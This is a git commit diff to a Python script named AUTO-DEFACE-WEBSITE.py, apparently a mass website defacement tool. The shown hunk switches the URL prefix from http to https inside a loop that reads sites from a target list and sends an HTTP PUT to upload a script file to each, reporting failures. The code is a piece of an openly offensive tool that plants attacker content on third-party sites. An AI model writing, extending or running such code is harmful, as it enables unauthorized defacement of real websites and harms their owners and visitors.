73ef05048a8732748f5b9dbd9c066b644563d27a
Garuda12cyber <88545901+Garuda12cyber@users.noreply.github.com>
2021-08-16 01:46:02 -0400

    Update AUTO-DEFACE-WEBSITE.py

--- AUTO-DEFACE-WEBSITE.py
+++ AUTO-DEFACE-WEBSITE.py
@@ -47,8 +47,8 @@ def aox(script,target_file="target.txt"):
       for web in target:
          try:
             site = web.strip()
-            if site.startswith("http://") is False:
-               site = "http://" + site
+            if site.startswith("https://") is False:
+               site = "https://" + site
             req = s.put(site+"/"+script,data=op)
             if req.status_code < 200 or req.status_code >= 250:
                print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
